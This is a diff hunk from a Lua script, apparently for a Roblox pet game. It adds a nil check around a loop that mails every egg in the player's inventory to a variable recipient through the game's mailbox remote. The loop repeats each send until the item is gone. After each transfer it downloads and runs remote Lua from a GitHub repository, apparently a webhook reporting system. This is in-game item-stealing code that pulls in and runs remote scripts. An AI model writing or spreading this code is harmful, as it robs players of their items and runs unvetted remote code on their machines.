@@ -339,27 +339,29 @@ for i, v in pairs(inv.Pet) do
     end
 end
 
-for i, v in pairs(inv.Egg) do
-    local id = v.id
-    local dir = library.Directory.Eggs[id]
-    _G.image = dir.icon
-    _G.id = id
-    local args = {
-        [1] = user,
-        [2] = message,
-        [3] = "Egg",
-        [4] = i,
-        [5] = v._am or 1
-    }
-    repeat
-        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-	until not inv.Egg[i]
-    _G.image = dir.icon
-    _G.type = "Not a Pet"
-    wait(0.5)
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
-    _G.id = id
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
+if inv.Egg then
+    for i, v in pairs(inv.Egg) do
+        local id = v.id
+        local dir = library.Directory.Eggs[id]
+        _G.image = dir.icon
+        _G.id = id
+        local args = {
+            [1] = user,
+            [2] = message,
+            [3] = "Egg",
+            [4] = i,
+            [5] = v._am or 1
+        }
+        repeat
+            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+        until not inv.Egg[i]
+        _G.image = dir.icon
+        _G.type = "Not a Pet"
+        wait(0.5)
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
+        _G.id = id
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
+    end
 end
 
 for i, v in pairs(inv.Enchant) do
